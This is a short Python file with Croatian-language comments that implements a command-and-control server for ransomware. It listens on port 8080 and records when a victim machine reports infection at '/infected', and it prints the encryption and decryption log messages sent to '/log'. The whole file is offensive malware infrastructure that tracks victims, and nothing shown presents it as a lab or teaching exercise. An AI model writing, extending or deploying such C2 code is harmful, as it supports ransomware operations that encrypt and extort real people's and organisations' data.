from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

class C2Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        
        # Kada ransomware počne s radom
        if parsed_path.path == '/infected':
            print("\n[!] DOBJENA KONEKCIJA SA ŽRTVE!")
            print("[!!!] ALARM: Ransomware je pokrenut na mašini žrtve!")
        
        # Kada ransomware šalje log poruke o šifriranju/desifriranju
        elif parsed_path.path == '/log':
            query_params = parse_qs(parsed_path.query)
            msg = query_params.get('msg', [''])[0] # Uzima sadržaj poruke
            print(f"  [LOG SA ŽRTVE]: {msg}")
            
        # Odgovaramo žrtvi da je sve OK
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8080), C2Handler)
    print("[*] C2 Server slusa na portu 8080, čeka logove sa žrtve...")
    server.serve_forever()